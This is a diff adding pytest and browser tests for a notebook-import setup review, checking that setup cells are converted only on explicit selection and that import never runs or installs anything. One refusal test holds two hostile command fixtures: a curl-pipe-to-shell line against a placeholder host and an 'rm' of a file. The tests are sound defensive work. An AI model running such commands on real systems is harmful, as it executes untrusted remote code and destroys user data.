@@ -163,6 +163,247 @@ def _stateful_notebook_upload():
     )
 
 
+def _setup_notebook_upload(*, setup="%pip install numpy==2.2.6\nvalues = [3, 5]\n"):
+    """A public, deliberately unexecuted upload with two explicit setup cells."""
+    notebook = {
+        "nbformat": 4,
+        "nbformat_minor": 5,
+        "metadata": {"language_info": {"name": "python"}, "custom": {"keep": True}},
+        "cells": [
+            {
+                "id": "intro",
+                "cell_type": "markdown",
+                "source": "# Review notebook setup\n![plot](attachment:plot.png)",
+                "metadata": {},
+                "attachments": {"plot.png": {"image/png": "aGVsbG8="}},
+            },
+            {
+                "id": "install",
+                "cell_type": "code",
+                "source": setup,
+                "metadata": {"custom": {"keep": "setup metadata"}},
+                "execution_count": 7,
+                "outputs": [
+                    {"output_type": "stream", "name": "stdout", "text": "old setup\n"}
+                ],
+            },
+            {
+                "id": "plot",
+                "cell_type": "code",
+                "source": "%matplotlib inline\n",
+                "metadata": {},
+                "execution_count": None,
+                "outputs": [],
+            },
+            {
+                "id": "result",
+                "cell_type": "code",
+                "source": "from pathlib import Path\ntotal = sum(values)\nPath('setup-import-must-not-run.txt').write_text(str(total))\n",
+                "metadata": {"custom": {"keep": "result metadata"}},
+                "execution_count": 9,
+                "outputs": [
+                    {"output_type": "stream", "name": "stdout", "text": "old result\n"}
+                ],
+            },
+        ],
+    }
+    payload = json.dumps(notebook).encode("utf-8")
+    return SimpleNamespace(
+        name="review_notebook_setup.ipynb",
+        type="application/x-ipynb+json",
+        read=lambda: payload,
+    )
+
+
+def _setup_notebook_review(monkeypatch, module_dir, *, upload=None):
+    _, fake_st, messages = _stateful_notebook_review(monkeypatch, module_dir)
+    uploaded = upload or _setup_notebook_upload()
+    preview = pipeline_editor.build_notebook_import_preview(
+        uploaded, module_dir, module_name="demo"
+    )
+    assert preview is not None
+    fake_st.session_state["idx__notebook_import_preview"] = preview
+    return preview, fake_st, messages
+
+
+def test_setup_review_requires_explicit_selection_and_restores_pristine_preview(
+    monkeypatch, tmp_path
+):
+    import copy
+
+    project = tmp_path / "review_setup_project"
+    preview, _, _ = _setup_notebook_review(monkeypatch, project)
+    original = copy.deepcopy(preview)
+    assert preview["preflight"]["safe_to_import"] is False
+    assert pipeline_editor.prepare_notebook_setup_preview(preview) == preview
+
+    reviewed = pipeline_editor.prepare_notebook_setup_preview(
+        preview, setup_cell_ids=["install", "plot"]
+    )
+    assert preview == original
+    assert reviewed["preflight"]["safe_to_import"] is True
+    assert reviewed["setup_cell_ids"] == ["install", "plot"]
+    assert reviewed["setup_requirements"] == ["numpy==2.2.6"]
+    assert "%pip install numpy==2.2.6" in reviewed["setup_source_diff"]
+    assert "matplotlib.use('Agg')" in reviewed["setup_source_diff"]
+    assert reviewed["contract"]["environment"]["requirements"] == ["numpy==2.2.6"]
+    source = reviewed["notebook_import"]["notebook_document"]["notebook"]
+    declaration = source["metadata"]["agilab"]["setup_conversion"]
+    assert declaration["installs_dependencies"] is False
+    assert declaration["executes_notebook"] is False
+    assert (
+        declaration["original_notebook_document"]
+        == original["notebook_import"]["notebook_document"]
+    )
+    assert source["cells"][1]["outputs"] == []
+    assert source["cells"][1]["execution_count"] is None
+    assert (
+        source["cells"][0]
+        == original["notebook_import"]["notebook_document"]["notebook"]["cells"][0]
+    )
+    assert (
+        source["cells"][3]
+        == original["notebook_import"]["notebook_document"]["notebook"]["cells"][3]
+    )
+    assert (
+        pipeline_editor.prepare_notebook_setup_preview(reviewed, setup_cell_ids=[])
+        == original
+    )
+    partial = pipeline_editor.prepare_notebook_setup_preview(
+        reviewed, setup_cell_ids=["install"]
+    )
+    assert partial["preflight"]["safe_to_import"] is False
+    assert (
+        partial["notebook_import"]["notebook_document"]["notebook"]["cells"][2][
+            "source"
+        ]
+        == "%matplotlib inline\n"
+    )
+    assert not project.exists()
+
+
+@pytest.mark.parametrize("selected", [[], ["plot"]])
+def test_setup_review_rejects_tampered_previous_original_even_without_new_conversion(
+    monkeypatch, tmp_path, selected
+):
+    import copy
+
+    project = tmp_path / "tampered_previous_setup_project"
+    preview, _, _ = _setup_notebook_review(monkeypatch, project)
+    reviewed = pipeline_editor.prepare_notebook_setup_preview(
+        preview, setup_cell_ids=["install"]
+    )
+    document = copy.deepcopy(
+        reviewed["notebook_import"]["notebook_document"]["notebook"]
+    )
+    document["metadata"]["agilab"]["setup_conversion"]["original_notebook_document"][
+        "sha256"
+    ] = "0" * 64
+    payload = json.dumps(document).encode()
+    upload = SimpleNamespace(
+        name="previously_converted.ipynb",
+        type="application/x-ipynb+json",
+        read=lambda: payload,
+    )
+    fresh, _, _ = _setup_notebook_review(monkeypatch, project, upload=upload)
+    with pytest.raises(ValueError, match="original|Original|fingerprint"):
+        pipeline_editor.prepare_notebook_setup_preview(fresh, setup_cell_ids=selected)
+    assert not project.exists()
+
+
+@pytest.mark.parametrize("preserve", [False, True])
+def test_setup_review_confirms_declared_requirements_without_execution(
+    monkeypatch, tmp_path, preserve
+):
+    project = tmp_path / "review_setup_project"
+    preview, _, messages = _setup_notebook_review(monkeypatch, project)
+    reviewed = pipeline_editor.prepare_notebook_setup_preview(
+        preview,
+        setup_cell_ids=["install", "plot"],
+        target_path=project / "lab_stages.toml",
+    )
+    count = pipeline_editor.confirm_notebook_import_preview(
+        project,
+        project / "lab_stages.toml",
+        "idx",
+        setup_cell_ids=["install", "plot"],
+        setup_review_signature=reviewed["setup_review_signature"],
+        runtime_roles={f"cell-{index}": "manager" for index in range(2, 5)},
+        preserve_notebook_state=preserve,
+    )
+    assert count == 3, messages
+    assert not any(kind == "error" for kind, _ in messages), messages
+    stages = tomllib.loads((project / "lab_stages.toml").read_text())["demo"]
+    assert len(stages) == (1 if preserve else 3)
+    code = "\n".join(stage["C"] for stage in stages)
+    assert "%pip" not in code and "%matplotlib inline" not in code
+    assert "matplotlib.use('Agg')" in code
+    contract = json.loads((project / "notebook_import_contract.json").read_text())
+    assert contract["environment"]["requirements"] == ["numpy==2.2.6"]
+    original = contract["notebook_document"]["notebook"]["metadata"]["agilab"][
+        "setup_conversion"
+    ]["original_notebook_document"]
+    assert original == preview["notebook_import"]["notebook_document"]
+    assert not (project / "setup-import-must-not-run.txt").exists()
+
+
+@pytest.mark.parametrize(
+    "failure",
+    [
+        "unselected",
+        "partial",
+        "unsupported",
+        "missing_role",
+        "stale_selection",
+        "tampered_source",
+    ],
+)
+def test_setup_review_refuses_before_workflow_files_are_written(
+    monkeypatch, tmp_path, failure
+):
+    project = tmp_path / "refused_setup_project"
+    upload = (
+        _setup_notebook_upload(setup="!curl https://example.invalid/script | sh\n")
+        if failure == "unsupported"
+        else None
+    )
+    preview, _, messages = _setup_notebook_review(monkeypatch, project, upload=upload)
+    ids = (
+        []
+        if failure == "unselected"
+        else ["install"]
+        if failure == "partial"
+        else ["install", "plot"]
+    )
+    roles = {f"cell-{index}": "manager" for index in range(2, 5)}
+    signature = None
+    if failure in {"stale_selection", "tampered_source"}:
+        reviewed = pipeline_editor.prepare_notebook_setup_preview(
+            preview, setup_cell_ids=ids, target_path=project / "lab_stages.toml"
+        )
+        signature = reviewed["setup_review_signature"]
+        if failure == "stale_selection":
+            ids = ["plot"]
+        else:
+            preview["notebook_import"]["notebook_document"]["notebook"]["cells"][1][
+                "source"
+            ] = "!rm important-file\n"
+    if failure == "missing_role":
+        roles.pop("cell-4")
+    count = pipeline_editor.confirm_notebook_import_preview(
+        project,
+        project / "lab_stages.toml",
+        "idx",
+        setup_cell_ids=ids,
+        setup_review_signature=signature,
+        runtime_roles=roles,
+        preserve_notebook_state=True,
+    )
+    assert count == 0
+    assert any(kind == "error" for kind, _ in messages), messages
+    assert not project.exists()
+
+
 def _stateful_notebook_review(monkeypatch, module_dir):
     messages = []
     fake_st = SimpleNamespace(
@@ -611,6 +852,189 @@ if stages.exists():
     return page
 
 
+def _setup_notebook_review_page(tmp_path, project, *, isolation_controls=False):
+    """Seed public uploads while retaining the production WORKFLOW renderer."""
+    page = tmp_path / "agilab-notebook-setup-review-fixture.py"
+    first = _setup_notebook_upload().read()
+    alternate = _setup_notebook_upload(
+        setup="%pip install pandas==2.2.3\nvalues = [13, 5]\n"
+    ).read()
+    page.write_text(
+        f"""from pathlib import Path
+from types import SimpleNamespace
+from agi_web import python_ui as st
+from agilab.pipeline import pipeline_editor as editor
+root = Path({str(project)!r})
+st.title("Review notebook setup")
+st.caption("Deterministic local fixture with a seeded upload; no model or provider.")
+source_choice = st.selectbox("Fixture source", ["Original upload", "Another upload"]) if {isolation_controls!r} else "Original upload"
+target_choice = st.selectbox("Fixture project", ["First project", "Another project"]) if {isolation_controls!r} else "First project"
+project = root if target_choice == "First project" else root.with_name(root.name + "_other")
+stages = project / "lab_stages.toml"
+payload = {first!r} if source_choice == "Original upload" else {alternate!r}
+identity = (source_choice, target_choice)
+st.session_state.setdefault("idx", [0, "", "", "", "", "", 0])
+if st.session_state.get("fixture_upload_identity") != identity:
+    uploaded = SimpleNamespace(name="review_notebook_setup.ipynb", type="application/x-ipynb+json", read=lambda: payload)
+    st.session_state["idx__notebook_import_preview"] = editor.build_notebook_import_preview(uploaded, project, module_name="demo")
+    st.session_state["fixture_upload_identity"] = identity
+editor.render_notebook_import_preview(project, stages, "idx", container=st)
+if stages.exists():
+    st.success("Notebook import saved.")
+    st.caption("Notebook has not been run; dependencies have not been installed.")
+""",
+        encoding="utf-8",
+    )
+    return page
+
+
+def test_setup_review_real_controls_require_explicit_choice_and_isolate_uploads_and_projects(
+    tmp_path,
+):
+    from agi_web.testing import AppTest
+
+    project = tmp_path / "setup_review_project"
+    page = _setup_notebook_review_page(tmp_path, project, isolation_controls=True)
+    app = AppTest.from_file(str(page), default_timeout=30).run()
+
+    def setup_control():
+        return next(
+            element
+            for element in app.multiselect
+            if element.label == "Setup cells to convert"
+        )
+
+    assert not app.exception
+    assert setup_control().value == []
+    assert not any(
+        element.label == "Import all runnable cells" for element in app.button
+    )
+    setup_control().set_value(["install", "plot"]).run()
+    assert not app.exception
+    assert any(
+        element.value == "Declared requirements: numpy==2.2.6"
+        for element in app.caption
+    )
+    assert any(
+        "matplotlib.use('Agg')" in element.value and "%pip install" in element.value
+        for element in app.code
+    )
+    setup_control().set_value([]).run()
+    assert not any(
+        element.label == "Import all runnable cells" for element in app.button
+    )
+    assert not any(
+        element.value.startswith("Declared requirements:") for element in app.caption
+    )
+
+    setup_control().set_value(["install", "plot"]).run()
+    first_key = setup_control().key
+    next(
+        element for element in app.selectbox if element.label == "Fixture source"
+    ).select("Another upload").run()
+    assert setup_control().value == [] and setup_control().key != first_key
+    setup_control().set_value(["install", "plot"]).run()
+    assert any(
+        element.value == "Declared requirements: pandas==2.2.3"
+        for element in app.caption
+    )
+    second_key = setup_control().key
+    next(
+        element for element in app.selectbox if element.label == "Fixture project"
+    ).select("Another project").run()
+    assert setup_control().value == [] and setup_control().key != second_key
+    setup_control().set_value(["install", "plot"]).run()
+    for index in range(2, 5):
+        next(
+            element
+            for element in app.selectbox
+            if element.label == f"Cell {index} runtime"
+        ).select("Manager (local runpy)").run()
+    next(
+        element
+        for element in app.checkbox
+        if element.label == "Preserve notebook state"
+    ).check().run()
+    assert any("Stages to write: 1" in element.value for element in app.code)
+    assert (
+        not project.exists() and not project.with_name(project.name + "_other").exists()
+    )
+    next(
+        element
+        for element in app.button
+        if element.label == "Import all runnable cells"
+    ).click().run()
+    assert not app.exception
+    written = project.with_name(project.name + "_other")
+    stages = tomllib.loads((written / "lab_stages.toml").read_text())["demo"]
+    assert len(stages) == 1 and stages[0]["NB_EXECUTION_STRATEGY"] == "shared_namespace"
+    assert not (written / "setup-import-must-not-run.txt").exists()
+    assert not project.exists()
+
+
+def test_setup_review_cancel_discards_only_pending_setup_choice(tmp_path):
+    from agi_web.testing import AppTest
+
+    project = tmp_path / "canceled_setup_project"
+    page = _setup_notebook_review_page(tmp_path, project)
+    app = AppTest.from_file(str(page), default_timeout=30).run()
+    choice = next(
+        element
+        for element in app.multiselect
+        if element.label == "Setup cells to convert"
+    )
+    choice.set_value(["install", "plot"]).run()
+    key = next(
+        element
+        for element in app.multiselect
+        if element.label == "Setup cells to convert"
+    ).key
+    assert key in app.session_state
+    next(
+        element for element in app.button if element.label == "Cancel import"
+    ).click().run()
+    assert not app.exception
+    assert key not in app.session_state
+    assert "idx__notebook_import_preview" not in app.session_state
+    assert app.session_state["idx"] == [0, "", "", "", "", "", 0]
+    assert not project.exists()
+
+
+@pytest.mark.parametrize("preserve", [False, True])
+def test_notebook_review_without_checkbox_preserves_saved_state_and_editor_drafts(
+    monkeypatch, tmp_path, preserve
+):
+    import copy
+
+    project = tmp_path / "read_only_notebook_review_project"
+    preview, fake_st, _ = _stateful_notebook_review(monkeypatch, project)
+    preview = pipeline_editor.prepare_notebook_import_preview(
+        preview,
+        runtime_roles={f"cell-{index}": "manager" for index in range(1, 4)},
+        preserve_notebook_state=preserve,
+    )
+    preview["preserve_notebook_state"] = preserve
+    fake_st.session_state["idx__notebook_import_preview"] = preview
+    fake_st.session_state["editor_draft"] = "unsaved notebook edits"
+    original_state = copy.deepcopy(fake_st.session_state)
+    target = SimpleNamespace(
+        caption=lambda *args, **kwargs: None,
+        code=lambda *args, **kwargs: None,
+        warning=lambda *args, **kwargs: None,
+        error=lambda *args, **kwargs: None,
+        button=lambda *args, **kwargs: False,
+    )
+    pipeline_editor.render_notebook_import_preview(
+        project, project / "lab_stages.toml", "idx", container=target
+    )
+    assert fake_st.session_state == original_state
+    assert (
+        fake_st.session_state["idx__notebook_import_preview"]["preserve_notebook_state"]
+        is preserve
+    )
+    assert not project.exists()
+
+
 def test_notebook_state_checkbox_uses_real_review_and_does_not_execute_on_import(
     tmp_path,
 ):
@@ -824,6 +1248,186 @@ def test_browser_reviews_stateful_import_then_runs_export_in_fresh_kernel(
             report["owned_host_stopped"] = not host.is_alive()
             (
                 evidence / "agilab-stateful-notebook-import-browser-validation.json"
+            ).write_text(json.dumps(report, indent=2, sort_keys=True))
+
+
+@pytest.mark.ui_robot
+@pytest.mark.skipif(
+    os.environ.get("AGILAB_RUN_NOTEBOOK_SETUP_UI_ROBOT") != "1",
+    reason="set AGILAB_RUN_NOTEBOOK_SETUP_UI_ROBOT=1 for the real Chromium setup review",
+)
+def test_browser_reviews_notebook_setup_before_import_without_execution(
+    monkeypatch, tmp_path
+):
+    import tempfile
+    from threading import Thread
+    from agi_web.react_python_host import ReactPythonServer
+    from playwright.sync_api import expect, sync_playwright
+    from test.conftest import REAL_HOME
+    from tools.agilab_widget_robot import _attach_browser_issue_capture
+
+    if not os.environ.get("PLAYWRIGHT_BROWSERS_PATH"):
+        for cache in (
+            REAL_HOME / "Library/Caches/ms-playwright",
+            REAL_HOME / ".cache/ms-playwright",
+            REAL_HOME / "AppData/Local/ms-playwright",
+        ):
+            if cache.is_dir():
+                monkeypatch.setenv("PLAYWRIGHT_BROWSERS_PATH", str(cache))
+                break
+    evidence = Path(
+        os.environ.get(
+            "AGILAB_NOTEBOOK_SETUP_UI_EVIDENCE",
+            str(tmp_path / "notebook-setup-review-browser-evidence"),
+        )
+    )
+    evidence.mkdir(parents=True, exist_ok=True)
+    source_root = Path(__file__).resolve().parents[1]
+    report = {
+        "schema": "agilab.notebook_setup_review_browser.v1",
+        "status": "failed",
+        "fixture": "Public pip and inline-plot notebook; seeded upload through real WORKFLOW renderer; no provider",
+        "checks": [],
+        "browser_issues": [],
+        "source_sha256": {
+            relative: hashlib.sha256((source_root / relative).read_bytes()).hexdigest()
+            for relative in (
+                "src/agilab/pipeline/pipeline_editor.py",
+                "src/agilab/pages/PROJECT_EDITOR.py",
+                "src/agilab/notebooks/notebook_pipeline_import.py",
+            )
+        },
+    }
+    with tempfile.TemporaryDirectory(
+        prefix="agilab-notebook-setup-ui-", dir="/tmp"
+    ) as fixture:
+        project = Path(fixture) / "notebook_setup_project"
+        page_path = _setup_notebook_review_page(tmp_path, project)
+        server = ReactPythonServer(("127.0.0.1", 0), page_path)
+        host = Thread(target=server.serve_forever, daemon=True)
+        host.start()
+        try:
+            with sync_playwright() as playwright:
+                browser = playwright.chromium.launch()
+                try:
+                    page = browser.new_page(viewport={"width": 1440, "height": 1100})
+                    issues = _attach_browser_issue_capture(page)
+                    report["browser_issues"] = issues
+                    page.goto(
+                        f"http://127.0.0.1:{server.server_port}",
+                        wait_until="networkidle",
+                    )
+                    choices = page.get_by_role(
+                        "listbox", name="Setup cells to convert", exact=True
+                    )
+                    expect(choices).to_have_values([])
+                    expect(
+                        page.get_by_role(
+                            "button", name="Import all runnable cells", exact=True
+                        )
+                    ).to_have_count(0)
+                    choices.select_option(
+                        label=[
+                            "Cell 2 (install): %pip install numpy==2.2.6",
+                            "Cell 3 (plot): %matplotlib inline",
+                        ]
+                    )
+                    expect(
+                        page.get_by_text(
+                            "Declared requirements: numpy==2.2.6", exact=True
+                        )
+                    ).to_be_visible()
+                    download = page.get_by_role(
+                        "link",
+                        name="Download notebook before setup conversion",
+                        exact=True,
+                    )
+                    expect(download).to_be_visible()
+                    response = page.request.get(
+                        f"http://127.0.0.1:{server.server_port}"
+                        + download.get_attribute("href")
+                    )
+                    assert response.status == 200
+                    assert response.json() == json.loads(
+                        _setup_notebook_upload().read()
+                    )
+                    expect(
+                        page.get_by_text("matplotlib.use('Agg')", exact=False).first
+                    ).to_be_visible()
+                    page.get_by_text("Runtime role per cell", exact=True).click()
+                    for index in range(2, 5):
+                        page.get_by_role(
+                            "combobox", name=f"Cell {index} runtime", exact=True
+                        ).select_option(label="Manager (local runpy)")
+                    page.get_by_role(
+                        "checkbox", name="Preserve notebook state", exact=True
+                    ).check()
+                    page.get_by_text("What will be written", exact=True).click()
+                    expect(
+                        page.get_by_text("Stages to write: 1", exact=False)
+                    ).to_be_visible()
+                    assert not project.exists()
+                    page.get_by_text("What will be written", exact=True).click()
+                    page.get_by_text("Runtime role per cell", exact=True).click()
+                    screenshot = (
+                        evidence / "agilab-notebook-import-setup-review-ready.png"
+                    )
+                    page.screenshot(path=str(screenshot), full_page=True)
+                    report["screenshot"] = {
+                        "path": str(screenshot),
+                        "sha256": hashlib.sha256(screenshot.read_bytes()).hexdigest(),
+                    }
+                    page.get_by_role(
+                        "button", name="Import all runnable cells", exact=True
+                    ).click()
+                    expect(
+                        page.get_by_text("Notebook import saved.", exact=True)
+                    ).to_be_visible()
+                    expect(
+                        page.get_by_text(
+                            "Notebook has not been run; dependencies have not been installed.",
+                            exact=True,
+                        )
+                    ).to_be_visible()
+                    stages = tomllib.loads((project / "lab_stages.toml").read_text())[
+                        "demo"
+                    ]
+                    assert (
+                        len(stages) == 1
+                        and stages[0]["NB_EXECUTION_STRATEGY"] == "shared_namespace"
+                    )
+                    contract = json.loads(
+                        (project / "notebook_import_contract.json").read_text()
+                    )
+                    assert contract["environment"]["requirements"] == ["numpy==2.2.6"]
+                    original = contract["notebook_document"]["notebook"]["metadata"][
+                        "agilab"
+                    ]["setup_conversion"]["original_notebook_document"]["notebook"]
+                    assert original == json.loads(_setup_notebook_upload().read())
+                    assert not (project / "setup-import-must-not-run.txt").exists()
+                    assert not issues, issues
+                    report.update(
+                        status="passed",
+                        checks=[
+                            "explicit_empty_default",
+                            "supported_setup_diff_and_requirements",
+                            "original_source_download",
+                            "explicit_manager_ownership",
+                            "one_shared_stage",
+                            "import_does_not_execute_or_install",
+                            "original_document_preserved",
+                            "browser_development_log_clean",
+                        ],
+                    )
+                finally:
+                    browser.close()
+        finally:
+            server.shutdown()
+            server.server_close()
+            host.join(timeout=10)
+            report["owned_host_stopped"] = not host.is_alive()
+            (
+                evidence / "agilab-notebook-setup-review-browser-validation.json"
             ).write_text(json.dumps(report, indent=2, sort_keys=True))
 
 
